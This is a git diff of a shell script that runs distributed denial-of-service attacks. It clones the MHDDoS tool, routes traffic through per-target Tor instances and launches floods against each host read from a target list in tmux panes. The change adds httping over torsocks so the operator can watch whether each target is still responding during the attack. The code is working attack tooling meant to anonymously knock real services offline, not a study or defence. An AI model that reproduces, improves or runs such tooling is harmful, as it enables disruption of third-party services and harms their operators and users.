@@ -25,6 +25,7 @@ apt_req=(
   iftop
   nethogs
   netcat-openbsd
+  httping
 )
 mhddos_repo="https://github.com/MHProDev/MHDDoS.git"
 mhddos_dir="${basedir}/mhddos"
@@ -106,6 +107,8 @@ grep -xv '' ${targets} | grep -v '^#' | while read -r target; do
   tor_pid=$(ps aux | grep "tor/$i/torrc" | head -1 | awk '{print $2}')
   tmux split-window -t ${tmux_session_name}:$i \
     "while true; do ./speed_control.sh ${tor_host} ${tor_socks_port} ${tor_control_port} ${tor_pid}; sleep 600; done"
+  tmux split-window -t ${tmux_session_name}:$i \
+    "torsocks -a ${tor_host} -P ${tor_socks_port} httping ${target}"
   tmux select-layout -t ${tmux_session_name}:$i tiled
 
   # Start target
@@ -115,5 +118,6 @@ grep -xv '' ${targets} | grep -v '^#' | while read -r target; do
     ${mhddos_socks_type} ${mhddos_threads} $i.txt ${mhddos_rpc} \
     ${mhddos_duration} ${mhddos_debug}; done"
   tmux split-window -t ${tmux_session_name}:$i "${command}"
+  tmux select-layout -t ${tmux_session_name}:$i tiled
 done
 
